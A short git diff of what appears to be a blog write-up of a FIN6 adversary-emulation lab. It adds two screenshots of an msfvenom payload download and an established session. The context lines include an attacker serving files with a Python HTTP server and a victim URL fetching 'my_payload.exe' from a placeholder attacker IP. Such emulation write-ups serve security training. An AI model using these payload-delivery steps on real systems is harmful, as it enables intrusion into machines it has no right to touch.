@@ -122,8 +122,12 @@ sudo python3 -m http.server 80
 Switch to the victim's Server. Open a browser and navigate to to the following address to download the payload to the Desktop. Make sure to replace
 the IP address placeholder with the IP address of the attackerVM:
 
-
 - http://[Attacker IP]/tmp/my_payload.exe
+
+![]({{site.baseurl}}/assets/img/2023-08-02-FIN6 Adversary Emulation - Phase 1/2023-08-02-Metasploit_Download_MsfVenom_Payload.png){:width="100%"}
+
+![]({{site.baseurl}}/assets/img/2023-08-02-FIN6 Adversary Emulation - Phase 1/2023-08-02-Metasploit_Established_MsfVenom_Payload.png){:width="100%"}
+
 
 
 ## Step 2 - FIN6 Discovery
